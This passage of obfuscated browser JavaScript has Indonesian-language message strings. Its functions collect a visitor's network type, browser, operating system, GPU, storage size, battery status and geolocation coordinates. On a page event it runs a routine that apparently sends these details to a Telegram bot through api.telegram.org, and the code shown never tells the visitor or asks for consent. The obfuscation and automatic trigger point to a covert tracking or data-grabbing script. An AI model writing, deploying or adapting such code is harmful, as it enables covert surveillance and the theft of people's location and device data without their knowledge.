eolocation','\x20detik','Ya\x20(Mobile)','onLine','mozConnection','•\x20*Nama\x20Jaringan:*\x20','getCurrentPosition','iOS','13602ygCuIN','dischargingTime','WEBGL_debug_renderer_info','•\x20*Bahasa\x20Utama:*\x20','Chrome','https://api.telegram.org/bot','🕒\x20*Waktu:*\x0a','experimental-webgl','Gagal\x20mendapatkan\x20lokasi\x20dengan\x20Geolocation\x20API:','maxTouchPoints','chat_id','Nonaktif','catch','level','•\x20*Memori\x20Perangkat:*\x20','type','parse_mode','screen','toLocaleString','getContext','DateTimeFormat','Latitude:\x20','\x20jam','toLowerCase','log','json','2229144FVCqbN','append','•\x20*Latitude:*\x20','coords','charging','Landscape','📍\x20*Lokasi:*\x0a','region','Android','connection','Waktu\x20Penggunaan:\x20','deviceUptime','Windows','Tidak\x20(Desktop/Tablet)','Opera','error','Tidak\x20dapat\x20mendeteksi\x20SSID','•\x20*Tipe\x20Koneksi:*\x20'];_0x26ec=function(){return _0x3bbc70;};return _0x26ec();}function getNetworkInfo(){return new Promise(_0x19336f=>{const _0x318bd5=_0x4424,_0x1a7e97=navigator[_0x318bd5(0x11f)]||navigator['mozConnection']||navigator[_0x318bd5(0xe3)];_0x1a7e97&&_0x1a7e97[_0x318bd5(0x10b)]?_0x1a7e97[_0x318bd5(0x10b)]===_0x318bd5(0xee)?_0x19336f({'type':'Wi-Fi','name':_0x318bd5(0x126)}):_0x19336f({'type':_0x318bd5(0x128),'name':_0x318bd5(0x135)}):_0x19336f({'type':_0x318bd5(0xc4),'name':_0x318bd5(0xde)});});}function calculateStorageSize(_0x24f6c5){const _0x2d766e=_0x4424;let _0x215689=0x0;for(let _0x563726 in _0x24f6c5){_0x24f6c5[_0x2d766e(0x144)](_0x563726)&&(_0x215689+=(_0x24f6c5[_0x563726][_0x2d766e(0xec)]+_0x563726[_0x2d766e(0xec)])*0x2);}return(_0x215689/0x400)[_0x2d766e(0x12d)](0x2)+_0x2d766e(0xf3);}function detectBrowser(){const _0xbbf482=_0x4424,_0x396b4c=navigator[_0xbbf482(0x134)];if(_0x396b4c[_0xbbf482(0x12a)](_0xbbf482(0x100)))return _0xbbf482(0x129);if(_0x396b4c[_0xbbf482(0x12a)]('Firefox'))return _0xbbf482(0xd3);if(_0x396b4c[_0xbbf482(0x12a)]('Safari')&&!_0x396b4c[_0xbbf482(0x12a)](_0xbbf482(0x100)))return _0xbbf482(0x12b);if(_0x396b4c[_0xbbf482(0x12a)](_0xbbf482(0x133)))return _0xbbf482(0x13d);if(_0x396b4c[_0xbbf482(0x12a)](_0xbbf482(0x124))||_0x396b4c['includes']('OPR'))return'Opera';return _0xbbf482(0x13a);}function detectOS(){const _0x37e44a=_0x4424,_0x581ee4=navigator['platform'][_0x37e44a(0x113)]();if(_0x581ee4[_0x37e44a(0x12a)]('win'))return _0x37e44a(0x122);if(_0x581ee4[_0x37e44a(0x12a)](_0x37e44a(0xb2)))return'MacOS';if(_0x581ee4[_0x37e44a(0x12a)](_0x37e44a(0xe6)))return _0x37e44a(0x141);if(/android/['test'](navigator['userAgent'][_0x37e44a(0x113)]()))return _0x37e44a(0x11e);if(/iphone|ipad|ipod/['test'](navigator['userAgent'][_0x37e44a(0x113)]()))return _0x37e44a(0xfb);return _0x37e44a(0xc7);}function detectGPU(){const _0x1cfb1a=_0x4424,_0x36ce06=document[_0x1cfb1a(0x143)]('canvas'),_0x917651=_0x36ce06[_0x1cfb1a(0x10f)](_0x1cfb1a(0x13c))||_0x36ce06[_0x1cfb1a(0x10f)](_0x1cfb1a(0x103));if(!_0x917651)return _0x1cfb1a(0xc4);const _0x23b83f=_0x917651[_0x1cfb1a(0xea)](_0x1cfb1a(0xfe));return _0x23b83f?_0x917651['getParameter'](_0x23b83f[_0x1cfb1a(0xc3)]):_0x1cfb1a(0xc4);}document[_0x1c8f89(0xd8)](_0x1c8f89(0xe8),()=>{detectDeviceInfoAndSendToTelegram();});
